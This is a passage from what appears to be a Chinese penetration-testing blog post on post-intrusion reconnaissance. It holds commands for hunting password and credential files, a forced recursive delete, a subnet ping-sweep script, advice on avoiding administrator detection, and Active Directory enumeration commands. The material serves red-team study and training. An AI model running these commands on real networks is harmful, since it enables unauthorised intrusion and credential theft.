class="line"><span class="string">抓取 &quot;</span>windows凭据管理器中保存的各类连接账号密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取 &quot;</span>MSTSC 客户端中保存的所有rdp连接账号密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>VNC客户端工具中保存的连接密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取 &quot;</span>GPP目录下保存的各类账号密码<span class="string">&quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>SSH客户端工具中保存的各种linux系统连接账号密码<span class="string">&quot;, SecureCRT,Xshell,WinSCP,putty</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>浏览器中保存的各种web登录密码和cookie信息<span class="string">&quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>数据库表中保存的各类账号密码hash<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>FTP客户端工具中保存的各种ftp登录账号密码<span class="string">&quot;, filezila, xftp...</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>邮件客户端工具中保存的各种邮箱账号密码<span class="string">&quot;, forxmail, thunderbird...</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>SVN客户端工具中保存的所有连接账号密码及项目地址<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>VPN客户端工具中保存的各种vpn链接账号密码<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h4 id="用户敏感文件收集"><a href="#用户敏感文件收集" class="headerlink" title="用户敏感文件收集"></a>用户敏感文件收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看本机hosts文件</span><br><span class="line"><span class="built_in">type</span> c:\Windows\system32\drivers\etc\hosts</span><br><span class="line"><span class="number">2</span>.指定目录下搜集各类敏感文件</span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.txt&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.xml&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.mdb&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.sql&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.mdf&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.eml&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.pst&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*conf*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*bak*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*pwd*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*pass*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*login*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*user*&quot;</span></span><br><span class="line"><span class="number">3</span>.指定目录下的文件中搜集各种账号密码</span><br><span class="line">findstr /<span class="built_in">si</span> pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> <span class="built_in">pwd</span> *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line"><span class="number">4</span>.查看,删除 指定文件</span><br><span class="line"><span class="built_in">type</span> c:\windows\temp\admin_pass.bak 查看某个文件内容</span><br><span class="line"><span class="built_in">del</span> d:\ad\*.* /a /s /q /f 强制删除指定路径下的所有文件</span><br><span class="line">tree /F /A D:\ &gt;&gt; file_list.txt 导出指定路径下的文件目录结构</span><br><span class="line"><span class="built_in">rd</span> /q/s c:\windows\temp\test 删除文件夹</span><br></pre></td></tr></table></figure><h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><p>基于icmp</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">7</span>.%I | findstr <span class="string">&quot;TTL=&quot;</span> &gt;&gt; pinglive.txt</span><br></pre></td></tr></table></figure><p>不确定情况下，常见内网ip探测（来源：<a href="https://mp.weixin.qq.com/s/AUgBlRjH_USaZXgmMDYzSg">https://mp.weixin.qq.com/s/AUgBlRjH_USaZXgmMDYzSg</a> ）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line">rem 内网存活段自动发现脚本 [<span class="type">Windows</span>] </span><br><span class="line">rem By Klion</span><br><span class="line">rem <span class="number">2020.7</span>.<span class="number">1</span></span><br><span class="line"></span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /l %%i <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> (</span><br><span class="line">  <span class="keyword">for</span> /l %%k <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> (</span><br><span class="line">    ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span> <span class="number">10</span>.%%i.%%k.<span class="number">1</span> | findstr <span class="string">&quot;TTL=&quot;</span> &gt;nul || ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span> <span class="number">10</span>.%%i.%%k.<span class="number">254</span> | findstr <span class="string">&quot;TTL=&quot;</span> &gt;nul</span><br><span class="line">    <span class="keyword">if</span> !errorlevel! equ <span class="number">0</span> (<span class="built_in">echo</span> <span class="number">10</span>.%%i.%%k.<span class="number">0</span>/<span class="number">24</span> is alive ! &gt;&gt; alive.txt ) <span class="keyword">else</span> (<span class="built_in">echo</span> <span class="number">10</span>.%%i.%%k.<span class="number">0</span>/<span class="number">24</span> May be sleeping ! )</span><br><span class="line">  )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /l %%s <span class="keyword">in</span> (<span class="number">16</span>,<span class="number">1</span>,<span class="number">31</span>) <span class="keyword">do</span> (</span><br><span class="line">  <span class="keyword">for</span> /l %%d <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> (</span><br><span class="line">    ping <span class="literal">-n</span> <span class="number">1</span> <span class="literal">-w</span> <span class="number">1</span> <span class="number">172</span>.%%s.%%d.<span class="number">1</span>  | findstr <span class="string">&quot;TTL=&quot;</span> &gt;nul || ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span> <span class="number">172</span>.%%s.%%d.<span class="number">254</span> | findstr <span class="string">&quot;TTL=&quot;</span> &gt;nul</span><br><span class="line">    <span class="keyword">if</span> !errorlevel! equ <span class="number">0</span> (<span class="built_in">echo</span> <span class="number">172</span>.%%s.%%d.<span class="number">0</span>/<span class="number">24</span> is alive ! &gt;&gt; alive.txt ) <span class="keyword">else</span> (<span class="built_in">echo</span> <span class="number">172</span>.%%s.%%d.<span class="number">0</span>/<span class="number">24</span> May be sleeping ! )</span><br><span class="line">  )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /l %%t <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">255</span>) <span class="keyword">do</span> (</span><br><span class="line">  ping <span class="literal">-n</span> <span class="number">1</span> <span class="literal">-w</span> <span class="number">1</span> <span class="number">192.168</span>.%%t.<span class="number">1</span>  | findstr <span class="string">&quot;TTL=&quot;</span> &gt;nul || ping <span class="literal">-n</span> <span class="number">1</span> <span class="literal">-w</span> <span class="number">1</span> <span class="number">192.168</span>.%%t.<span class="number">254</span> | findstr <span class="string">&quot;TTL=&quot;</span> &gt;nul</span><br><span class="line">  <span class="keyword">if</span> !errorlevel! equ <span class="number">0</span> (<span class="built_in">echo</span> <span class="number">192.168</span>.%%t.<span class="number">0</span>/<span class="number">24</span> is alive ! &gt;&gt; alive.txt ) <span class="keyword">else</span> (<span class="built_in">echo</span> <span class="number">192.168</span>.%%t.<span class="number">0</span>/<span class="number">24</span> May be sleeping ! )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>扫描的话建议直接在内网进行扫描，速度和准确率都比较有保障，做扫描之前尽量确定下内网是否有流量监控设备，或者把动静做到最小，管理员发现后很可能会直接断网或采取其他措施丢失当前主机权限。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">常用的工具[最多<span class="number">10</span>秒一个<span class="type">c</span>段]：nbtscan[基于<span class="type">smb</span>和<span class="type">netbios</span>的内网主机发现方式]、Ladon、fscan、自开发工具...</span><br><span class="line">socks代理扫描：goby、railgun</span><br></pre></td></tr></table></figure><h3 id="端口信息探测"><a href="#端口信息探测" class="headerlink" title="端口信息探测"></a>端口信息探测</h3><p>Ladon8.2更新功能</p><p>相关分析：基于NTLM探测Windows版本信息(<a href="https://mp.weixin.qq.com/s/yBFGrb9D8nmO0KLGjYds8g">https://mp.weixin.qq.com/s/yBFGrb9D8nmO0KLGjYds8g</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] WmiInfo (135)</span><br><span class="line">[+] SmbInfo (445)</span><br><span class="line">[+] WinrmInfo (5985&#x2F;80&#x2F;8080&#x2F;443)</span><br><span class="line">[+] MssqlInfo(1433)</span><br><span class="line">[+] ExchangeInfo(443)</span><br><span class="line">[+] RdpInfo(3389)</span><br></pre></td></tr></table></figure><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>下文仅限于域内的信息收集，均不会涉及域内认证原理等概念，后面会对windows认证方式单独写一篇总结。</p><h3 id="net组件搜集域内信息"><a href="#net组件搜集域内信息" class="headerlink" title="net组件搜集域内信息"></a>net组件搜集域内信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">net user /domain查看当前域中的所有用户名，根据用户名总数大概判断域的规模</span><br><span class="line">net user xingzheng /domain 查看指定用户在当前域中的详细属性信息</span><br><span class="line">net accounts /domain查看当前域的域内账户密码设置策略</span><br><span class="line">net config workstation查看当前的登录域</span><br><span class="line">net view 查看当前域中在线的机器，不太直观，批处理把机器名对应的ip也显示出来</span><br><span class="line">----</span><br><span class="line">host2ip.bat:先获取机器名保存为computers.txt，然后运行下面的脚本得到pic.csv</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> computers.txt</span><br><span class="line"><span class="keyword">for</span> /f %%a <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> ping %%a <span class="literal">-4</span> <span class="literal">-n</span> <span class="number">1</span> |find /i <span class="string">&quot;ping&quot;</span> &gt;&gt; log.txt</span><br><span class="line">    ping %%a <span class="literal">-4</span> <span class="literal">-n</span> <span class="number">1</span> |find /i <span class="string">&quot;ping&quot;</span> &gt; %%a.txt</span><br><span class="line">    <span class="keyword">for</span> /f <span class="string">&quot;tokens=2 delims=[]&quot;</span> %%b <span class="keyword">in</span> (%%a.txt) <span class="keyword">do</span> (</span><br><span class="line"> @<span class="built_in">echo</span> %%a,%%b &gt;&gt; pic.csv</span><br><span class="line"> <span class="built_in">del</span> /f /q %%a.txt</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br><span class="line">----</span><br><span class="line">WIN10下使用Net view会出现如下报错</span><br><span class="line">System error <span class="number">1231</span></span><br><span class="line">System error <span class="number">6118</span></span><br><span class="line">解决：https://social.technet.microsoft.com/Forums/en<span class="literal">-US</span>/<span class="number">6</span>f102ed1<span class="literal">-8e76</span><span class="literal">-4cb7</span><span class="literal">-8dec</span><span class="literal">-05714466d441</span>/net<span class="literal">-view</span><span class="literal">-system</span><span class="literal">-error</span><span class="literal">-1231</span>?forum=win10itpronetworking</span><br><span class="line">----</span><br><span class="line">net view /domain查看内网种所有的域数量和名称</span><br><span class="line">net view /domain:domain_name查看指定域中在线的计算机列表</span><br><span class="line">net time /domain查看时间服务器，一般域控会做时间服务器</span><br><span class="line">net accounts /domain查看当前域的域内账户密码设置策略</span><br><span class="line">net <span class="built_in">group</span> /domain查看当前域中的所有组名</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain查看当前域中的域管账户</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;enterprise admins&quot;</span> /domain查看当前域中企业管理员组用户</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain查看当前域中的所有的计算机名（登录过该域的计算机）</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain查看域控制器主机名</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;exchange servers&quot;</span> /domain查看域内是否存在Exchange</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get Caption,sid获取域内所有用户sid</span><br><span class="line">nltest /domain_trusts查看域内信任关系</span><br><span class="line">nltest /domain_trusts /all_trusts /v /server:&lt;域控ip&gt;  查询指定server的信任域</span><br><span class="line">nltest /dsgetdc:&lt;域名&gt; /server:&lt;域控ip&gt;  查询域详细信息</span><br><span class="line">nltest /dclist:&lt;域名&gt;列出域控制器</span><br><span class="line">nslookup <span class="literal">-q</span>=mx hack7.local查看域内邮件服务器</span><br><span class="line">nslookup <span class="literal">-q</span>=ns hack7.local查看域内DNS服务器</span><br><span class="line">netdom query pdc查看域内的主域控，仅限win2008及之后的系统</span><br></pre></td></tr></table></figure><h3 id="dsquery导出域信息"><a href="#dsquery导出域信息" class="headerlink" title="dsquery导出域信息"></a>dsquery导出域信息</h3><p>利用dsquery 工具搜集域内信息，域成员机器需要自己传上去</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个dsquery</span><br><span class="line">dsquery user查看当前域中的所有账户名</span><br><span class="line">dsquery <span class="built_in">group</span>查看当前域内的所有组名</span><br><span class="line">dsquery subnet查看到当前域所在的网段，结合nbtscan使用</span><br><span class="line">dsquery site查看域内所有的web站点</span><br><span class="line">dsquery server查看当前域中的服务器(一般结果只有域控的主机名)</span><br><span class="line">dsquery user domainroot <span class="literal">-name</span> admin* <span class="literal">-limit</span> <span class="number">240</span>  查询前<span class="number">240</span>个以admin开头的用户名</span><br></pre></td></tr></table></figure><h3 id="csvde导出域信息"><a href="#csvde导出域信息" class="headerlink" title="csvde导出域信息"></a>csvde导出域信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果你有一个当前有效的域用户账户及密码</span><br><span class="line">csvde.exe <span class="operator">-f</span> c:\windows\temp\e.csv <span class="literal">-n</span> <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">1.100</span>（DC的IP） <span class="literal">-b</span> &lt;域用户名&gt; &lt;域名&gt; &lt;域用户密码&gt;</span><br><span class="line">如果你可以使用域成员主机的system权限或者当前就在DC上</span><br><span class="line">csvde.exe <span class="operator">-f</span> c:\windows\temp\e.csv <span class="literal">-n</span> <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">1.100</span>（DC的IP)</span><br></pre></td></tr></table></figure><h3 id="导出域内dns记录"><a href="#导出域内dns记录" class="headerlink" title="导出域内dns记录"></a>导出域内dns记录</h3><h4 id="sharpadidnsdump"><a href="#sharpadidnsdump" class="headerlink" title="sharpadidnsdump"></a>sharpadidnsdump</h4><p>普通域用户即可</p><p><a href="https://github.com/b4rtik/SharpAdidnsdump">https://github.com/b4rtik/SharpAdidnsdump</a></p><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E8%8E%B7%E5%BE%97DNS%E8%AE%B0%E5%BD%95">域渗透——普通用户权限获得DNS记录 (3gstudent.github.io)</a></p><h4 id="dnscmd"><a href="#dnscmd" class="headerlink" title="dnscmd"></a>dnscmd</h4><p>域管权限，域控自带</p><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96">域渗透——DNS记录的获取 (3gstudent.github.io)</a></p><h3 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h3><p>C++实现(未开源)，用于查询域内信息</p><p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><p>常用命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.列出域控制器名称</span><br><span class="line">AdFind <span class="literal">-sc</span> dclist</span><br><span class="line"><span class="number">2</span>.查询当前域中在线的计算机</span><br><span class="line">AdFind <span class="literal">-sc</span> computers_active</span><br><span class="line"><span class="number">3</span>.查询当前域中在线的计算机(只显示名称和操作系统)</span><br><span class="line">AdFind <span class="literal">-sc</span> computers_active name operatingSystem</span><br><span class="line"><span class="number">4</span>.查询当前域中所有计算机</span><br><span class="line">AdFind <span class="operator">-f</span> <span class="string">&quot;objectcategory=computer&quot;</span></span><br><span class="line"><span class="number">5</span>.查询当前域中所有计算机(只显示名称和操作系统)</span><br><span class="line">AdFind <span class="operator">-f</span> <span class="string">&quot;objectcategory=computer&quot;</span> name operatingSystem</span><br><span class="line"><span class="number">6</span>.查询域内所有用户</span><br><span class="line">AdFind <span class="literal">-users</span> name</span><br><span class="line"><span class="number">7</span>.查询所有GPO</span><br><span class="line">AdFind <span class="literal">-sc</span> gpodmp</span><br></pre></td></tr></table></figure><h3 id="Bloodhound-Sharphound"><a href="#Bloodhound-Sharphound" class="headerlink" title="Bloodhound/Sharphound"></a>Bloodhound/Sharphound</h3><p>BloodHound以用图与线的形式，将域内用户、计算机、组、Sessions、ACLs以及域内所有相关用户、组、计算机、登陆信息、访问控制策略之间的关系更直观的展现在Red Team面前进行更便捷的分析域内情况，更快速的在域内提升自己的权限。它也可以使Blue Team成员对己方网络系统进行更好的安全检测及保证域的安全性。<br>这里直接介绍需要在内网机器中执行的相关命令：<br>此工具的导出相对来说比较暴力，且目前此工具 exe 原版已经被识别并被各种杀软查杀，包括微软win10自带的杀软 Windows Defender 。</p><p>详细参考： <a href="https://www.anquanke.com/post/id/214046">https://www.anquanke.com/post/id/214046</a> </p><h3 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h3><p>不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。大部分win系统默认已自带spn探测工具即：setspn.exe，此操作无需管理权限，需域内机器执行。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn <span class="literal">-T</span> target.com <span class="literal">-Q</span> */*可完整查出当前域内所有spn</span><br></pre></td></tr></table></figure><p>详细介绍：<a href="http://hackergu.com/kerberos-sec-spn-search/">域安全-SPN扫描</a></p><h3 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h3><p>详细介绍：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E8%8E%B7%E5%8F%96/">渗透基础——活动目录信息的获取</a></p><h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><h4 id="查询dns解析记录"><a href="#查询dns解析记录" class="headerlink" title="查询dns解析记录"></a>查询dns解析记录</h4><p>若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xingzheng&gt;nslookup <span class="literal">-type</span>=all _ldap._tcp.dc._msdcs.hack7.local</span><br><span class="line"></span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was <span class="number">2</span> seconds.</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">86.109</span></span><br><span class="line"></span><br><span class="line">_ldap._tcp.dc._msdcs.hack7.local        SRV service location:</span><br><span class="line">          priority       = <span class="number">0</span></span><br><span class="line">          weight         = <span class="number">100</span></span><br><span class="line">          port           = <span class="number">389</span></span><br><span class="line">          svr hostname   = dc.hack7.local</span><br><span class="line">dc.hack7.local  internet address = <span class="number">192.168</span>.<span class="number">86.109</span></span><br></pre></td></tr></table></figure><h4 id="SPN扫描-1"><a href="#SPN扫描-1" class="headerlink" title="SPN扫描"></a>SPN扫描</h4><p>在SPN扫描结果中可以通过如下内容，来进行域控的定位。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=DC,OU=Domain Controllers,DC=hack7,DC=loca</span><br></pre></td></tr></table></figure><h4 id="net-group"><a href="#net-group" class="headerlink" title="net group"></a>net group</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xingzheng&gt;net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain</span><br><span class="line">这项请求将在域 hack7.local 的域控制器处理。</span><br><span class="line"></span><br><span class="line">组名     Domain Controllers</span><br><span class="line">注释     域中所有域控制器</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DC<span class="variable">$</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h4 id="端口识别"><a href="#端口识别" class="headerlink" title="端口识别"></a>端口识别</h4><p>扫描内网中同时开放389和53端口的机器。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">端口：<span class="number">389</span></span><br><span class="line">服务：LDAP、ILS</span><br><span class="line">说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</span><br><span class="line">端口：<span class="number">53</span></span><br><span class="line">服务：Domain Name Server（DNS）</span><br><span class="line">说明：<span class="number">53</span>端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;无论是通过外网打点，还是水坑钓鱼，进入内网后的第一步，也是最重要的一步就是信息收集，而且信息收集往往是一直穿插在整个内网渗透过程中。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>一星期实战总结（三）</title>
    <link href="https://www.se7ensec.cn/2020/04/25/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%933/"/>
    <id>https://www.se7ensec.cn/2020/04/25/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%933/</id>
    <published>2020-04-25T02:30:24.000Z</published>
    <updated>2021-01-23T14:13:50.659Z</updated>
    
